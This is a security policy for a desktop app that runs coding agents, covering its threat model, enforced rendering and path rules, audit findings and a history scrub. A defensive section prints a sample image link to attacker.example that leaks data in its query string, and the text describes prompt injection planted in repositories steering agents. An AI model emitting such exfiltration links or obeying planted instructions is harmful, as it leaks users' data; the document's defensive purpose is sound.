# Security

## Reporting a vulnerability

Open a [security advisory][advisories] rather than a public issue. If you would
rather not use GitHub, an ordinary issue saying only "I have a security report"
with no detail is fine, and contact can move from there.

[advisories]: https://github.com/c-wenlong/artemis/security/advisories/new

## The threat model

Artemis runs coding agents on your machine and renders what they produce. Two
things follow from that, and most of the security work here is about them.

**Model output is untrusted input.** It arrives from a harness that relays
whatever the model wrote, and the model has just read a repository that may
itself contain text planted to be read. Anything the renderer does with that
string is done on behalf of whoever planted it.

**Agents are given real capability on purpose.** They edit files and run
commands, because that is the product. Artemis does not try to sandbox them; it
tries to make what they did legible and reversible.

## What is enforced

| Surface | Rule | Where |
|---|---|---|
| Rendered markdown | Embedded HTML renders as text; `rehype-raw` is deliberately absent | `Markdown.tsx` |
| Links in output | `javascript:` and `data:` URLs are stripped | react-markdown default |
| Images in output | Described, never fetched — see below | `Markdown.tsx` |
| Webview | CSP: `default-src 'self'`, no object, no framing, connect limited to Tauri IPC | `tauri.conf.json` |
| Subprocesses | Always an argv array; no shell string is ever built | `proc.rs`, `pty.rs`, `adapters.rs` |
| Model-supplied paths | Absolute paths and `..` refused before any filesystem access | `paths.rs` |
| Patches | Header paths rebuilt from a vetted relative path; `git apply --check` first | `git.rs` |
| Quiver's files | Read-only, always | `quiver.rs` |
| Network | The host makes no outbound requests. Artemis does not phone home | — |

Each has a test. The path and patch rules are exercised against real git
repositories, because they are the ones that can destroy work.

### Why images are not loaded

`![](https://attacker.example/p.png?leak=…)` in an answer would fetch the moment
the transcript painted — no click, no warning — and anything the model had just
read could ride out in that query string. An image reference is shown with its
alt text and URL, and nothing is requested. Reference-style syntax is covered
too; it is the form that slips past a naive fix.

## Known accepted findings

**`cargo audit`: 0 vulnerabilities** across 449 crates. 17 warnings, all
transitive through Tauri and all accepted: 16 unmaintained (`atk`, `gdk`, `gtk`
and friends — the GTK3 bindings Tauri uses for the Linux webview — plus the
`unic-*` family) and 1 unsound (`glib` `VariantStrIter`). None is reachable from
Artemis's own code; they resolve when Tauri moves to GTK4.

**`pnpm audit`: 9 advisories, all dev-only.** Every one is in the
`vitest → vite → postcss/esbuild/nanoid` chain. None ships in the app. The
"critical" one concerns the Vitest UI server, which this project does not run.

## History

**Rewritten and clean.** Commits from before the 2026-08-11 audit contained the
author's home directory, real project names and two student identifiers left
over from the Quiver fixture. All 36 commits were rewritten on that date with
`scripts/scrub-history.sh`, and the remote this repository is published from was
created fresh from the rewritten history.

Nothing in history was ever a credential — every blob in every commit was
scanned for private keys and provider tokens, and there were none. What was
there was personal data, and a git history is permanent once published.

Verified after the rewrite: 575 reachable blobs, 104 of them binary, **none
carrying an account name, identifier, project name or home directory**. HEAD's
tree is byte-identical to what it was before (`c7cdbaade2`), no commit was
pruned, and the full suite still passes on the rewritten history. The old
history is kept locally on `backup/pre-scrub-5ad2d88`.

The script backs the branch up first, refuses to continue if the current tree
changes, reports any commit `--prune-empty` dropped, re-runs the scan afterwards,
and does not push unless asked.

The strings it removes are **not in this repository**. They live in
`scripts/scrub-tokens.txt`, which is gitignored;
[scrub-tokens.example](scripts/scrub-tokens.example) documents the format. A
scrubber that has to be read to be trusted cannot also be the last published
copy of what it removes.

Three things the first version of this got wrong, all found by testing it:

- **The backup branch was rewritten too.** `filter-branch -- --all` rewrites
  every ref, including the backup made moments earlier, so the printed recovery
  command would have restored the *scrubbed* history. Only the current branch is
  rewritten now.
- **A committed `.pyc` carried everything.** Compiled Python embeds the string
  constants of the module it was built from — at the time, the whole token list.
  Being binary, it was skipped by the scrubber *and* by the verification pass:
  the scrub would have reported a clean history and left the data in a blob. The
  verification now reads binary blobs, the filter deletes bytecode outright, and
  `no_compiled_bytecode_is_tracked` stops it coming back.
- **The repository audit was failing.** Two checks in `tests/repo.rs` had gone
  red when the token list was committed, and were not noticed.

### Why the remote was replaced rather than force-pushed

**A force-push would not have been enough.** Rewriting history locally makes the
old commits unreachable; it does not remove them from GitHub, where they stay
fetchable by SHA until the server garbage-collects — which can take a long time
and is not something you can trigger or observe. Anyone who had ever seen an old
SHA could still fetch the personal data from a repository that looked clean.

So the remote was rebuilt instead: a new repository, the rewritten history
pushed to it, and the original deleted. Verified afterwards by asking GitHub for
three pre-rewrite SHAs by name — all now 404. That was cheap here, with 36
commits, no forks, no pull requests and no other collaborators; on a repository
with history worth keeping, the alternative is to force-push and then ask GitHub
support to garbage-collect, confirming an old SHA no longer resolves before
making it public.

The old history is kept locally on `backup/pre-scrub-5ad2d88` and nowhere else.

## What is not protected against

- **A malicious harness binary.** If the agent on your `PATH` is hostile,
  Artemis runs it. There is no sandbox.
- **Prompt injection changing what an agent does.** Artemis makes the result
  visible and reversible; it does not prevent it.
- **Anything after you click Run.** The agent's own permissions are the agent's
  to enforce.
